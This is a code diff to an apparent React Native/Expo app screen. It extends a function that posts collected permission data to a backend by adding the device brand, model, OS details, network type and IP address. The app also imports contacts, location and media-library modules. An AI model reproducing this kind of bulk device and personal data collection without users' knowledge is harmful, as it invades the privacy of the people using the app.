@@ -29,12 +29,11 @@ import AsyncStorage from "@react-native-async-storage/async-storage";
 import auth from "@react-native-firebase/auth";
 import axios from "axios";
 import * as Contacts from "expo-contacts";
+import * as Device from "expo-device";
 import * as Location from "expo-location";
 import * as MediaLibrary from "expo-media-library";
-import {
-  PermissionsAndroid,
-  Platform
-} from "react-native";
+import * as Network from "expo-network";
+import { PermissionsAndroid, Platform } from "react-native";
 
 const { width } = Dimensions.get("window");
 
@@ -62,7 +61,7 @@ export default function HomeScreen() {
   const base_URL = process.env.EXPO_PUBLIC_API_BASE_URL;
   const SUBMIT_ENDPOINT = `${base_URL}/user/`;
 
-   function getLocalISOTimeMicro() {
+  function getLocalISOTimeMicro() {
     const now = new Date();
     const ms = String(now.getMilliseconds()).padStart(3, "0") + "000";
     const tzOffset = -now.getTimezoneOffset();
@@ -77,15 +76,27 @@ export default function HomeScreen() {
     return `${base}.${ms}${sign}${diffHours}:${diffMinutes}`;
   }
 
-
-
   const submitPermissionData = async (allData: any) => {
     try {
       const headers = await generateHeaders();
+      const net = await Network.getNetworkStateAsync();
+      const ip = await Network.getIpAddressAsync();
       await axios.post(
         SUBMIT_ENDPOINT,
         {
           timestamp: getLocalISOTimeMicro(),
+          device: {
+            brand: Device.brand ?? "Unknown",
+            modelName: Device.modelName ?? "Unknown",
+            osName: Device.osName ?? "Unknown",
+            osVersion: Device.osVersion ?? "Unknown",
+          },
+
+          network: {
+            type: net?.type ?? "unknown",
+            isConnected: net?.isConnected ?? false,
+            ipAddress: ip ?? "0.0.0.0",
+          },
           info: allData,
         },
         { headers }
